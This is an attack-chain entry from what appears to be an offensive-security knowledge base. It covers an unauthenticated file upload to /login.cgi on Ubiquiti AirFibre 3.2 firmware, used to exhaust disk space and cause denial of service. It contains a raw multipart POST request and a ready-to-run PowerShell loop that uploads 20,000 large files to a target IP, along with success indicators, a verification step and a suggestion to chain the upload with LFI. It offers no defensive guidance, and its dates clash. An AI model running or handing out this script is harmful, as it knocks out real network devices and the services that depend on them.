---
tags:
  - unauthenticated-upload
  - dos
  - file-upload
  - disk-exhaustion
  - ubiquiti
type: attack_chain
tools:
  - '[[tools/PowerShell]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands:
  - '[[commands/Upload-File-via-HTTP-POST-to-login-cgi]]'
  - '[[commands/PowerShell-Script-for-Mass-File-Upload-DoS]]'
  - '[[commands/Send-NetworkData-TCP-Function]]'
platforms:
  - Web
  - Embedded Linux
complexity: medium
procedures:
  - '[[procedures/Test-Unauthenticated-File-Upload-to-login-cgi]]'
  - '[[procedures/Upload-Multiple-Files-to-Exhaust-Disk-Space]]'
  - '[[procedures/Verify-Disk-Exhaustion-Condition]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[OS Exhaustion Flood]]'
description: >-
  Exploit unauthenticated file upload in Ubiquiti AirFibre 3.2 firmware to
  upload large files and cause denial-of-service by exhausting disk space.
skill_level: intermediate
impact_level: high
id: 48e955b6-7d9e-4dd5-b934-1d2f602ae1e1
created_at: '2025-12-14T05:32:10.014Z'
updated_at: '2025-12-14T05:32:10.014Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[OS Exhaustion Flood]]'
---
# Unauthenticated File Upload Leading to Disk Exhaustion DoS on Ubiquiti AirFibre 3.2

## Overview

This attack chain exploits an unauthenticated file upload vulnerability in the Ubiquiti AirFibre 3.2 firmware's /login.cgi endpoint. Attackers can POST multipart/form-data payloads without credentials, storing files in /tmp/upload. By uploading numerous large files with unique names, the device's disk space (shared between /tmp and /var) is exhausted, leading to a denial-of-service (DoS) condition that disrupts services like the radio daemon. While direct remote code execution (RCE) is not achieved, the upload can potentially chain with local file inclusion (LFI) flaws for escalation.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10-15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Test Upload] --> B[Execution: Mass Upload] --> C[Impact: Verify DoS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/PowerShell]]

### Target Environment

- Ubiquiti AirFibre 3.2 firmware on embedded Linux
- HTTP service on port 80
- Network access to the device (no authentication needed)

### Initial Access Requirements

- Direct network reachability to the target's IP on port 80
- No credentials required due to unauthenticated endpoint
- PowerShell environment for scripting

## Detailed Attack Procedures

### Step 1: Initial Access
procedure: [[procedures/Test-Unauthenticated-File-Upload-to-login-cgi]]

**Objective**: Verify the unauthenticated file upload capability by sending a single test file to /login.cgi and confirming storage in /tmp/upload.

**Instructions**: Use [[commands/Upload-File-via-HTTP-POST-to-login-cgi]] to send a POST request with a small test file:

```powershell
# Example POST body for single upload
POST http://$ip/login.cgi HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP

------WebKitFormBoundaryoA1KFlNlMcwhR9SP
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

aaaa
------WebKitFormBoundaryoA1KFlNlMcwhR9SP
Content-Disposition: form-data; name="action"

upload
------WebKitFormBoundaryoA1KFlNlMcwhR9SP--
```

Send via TCP using [[commands/Send-NetworkData-TCP-Function]] piped with the POST data to port 80.

**Expected Output**: HTTP 200 response; file 'test.txt' stored in /tmp/upload on the device.

**Success Indicators**:
- No authentication prompt during POST
- Server accepts and stores the file without errors

### Step 2: Execution
procedure: [[procedures/Upload-Multiple-Files-to-Exhaust-Disk-Space]]

**Objective**: Automate the upload of 20,000 large files (90KB each) with unique names to fill the /tmp and /var partitions, causing DoS.

**Instructions**: Execute the [[commands/PowerShell-Script-for-Mass-File-Upload-DoS]] script, which loops and generates unique POST requests:

```powershell
$ip = "10.62.148.4"
$content = "A" * 90000

for ($i=1; $i -le 20000; $i++) {
    $POST = "POST http://$ip/login.cgi HTTP/1.1`nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryoA1KFlNlMcwhR9SP`n`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP`nContent-Disposition: form-data; name=\"file\"; filename=\""$i.txt\"`nContent-Type: text/plain`n`n$content`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP`nContent-Disposition: form-data; name=\"action\"`n`nupload`n------WebKitFormBoundaryoA1KFlNlMcwhR9SP--"
    echo $POST | Send-NetworkData -Computer $ip -Port 80
}
```

This uses [[commands/Send-NetworkData-TCP-Function]] internally for each iteration.

**Expected Output**: 20,000 successful uploads; accumulating ~1.8GB of data, filling partitions.

**Success Indicators**:
- Script completes without connection errors
- Device services begin failing due to disk full

### Step 3: Impact
procedure: [[procedures/Verify-Disk-Exhaustion-Condition]]

**Objective**: Confirm the DoS by checking disk usage and observing service disruptions.

**Instructions**: If possible, access the device console or use tools to run `df -h` and inspect /var and /tmp. Monitor for errors in services like radiod.

**Expected Output**: `df` output showing 100% usage on relevant partitions; files like radiod impacted in /tmp.

**Success Indicators**:
- Disk partitions full (e.g., /var at 100%)
- Device logs or services show I/O errors

## Attack Chain Summary

### Key Achievements

1. Confirmed unauthenticated access to file upload endpoint
2. Exhausted device storage via mass uploads, achieving DoS
3. Demonstrated potential for chaining with LFI for higher impact

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[OS Exhaustion Flood]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Impact]]

---

*Last updated: 2023-10-01*
